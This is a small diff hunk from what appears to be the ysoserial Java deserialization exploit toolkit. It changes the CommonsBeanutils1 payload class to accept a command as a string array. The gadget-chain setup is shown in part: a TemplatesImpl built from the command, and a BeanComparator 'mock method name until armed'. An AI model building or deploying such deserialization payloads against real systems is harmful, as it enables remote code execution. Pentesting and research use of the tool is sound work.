@@ -14,7 +14,7 @@ import ysoserial.payloads.util.Reflections;
 @Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "commons-collections:commons-collections:3.1", "commons-logging:commons-logging:1.2"})
 public class CommonsBeanutils1 implements ObjectPayload<Object> {
 
-	public Object getObject(final String command) throws Exception {
+	public Object getObject(final String[] command) throws Exception {
 		final Object templates = Gadgets.createTemplatesImpl(command);
 		// mock method name until armed
 		final BeanComparator comparator = new BeanComparator("lowestSetBit");
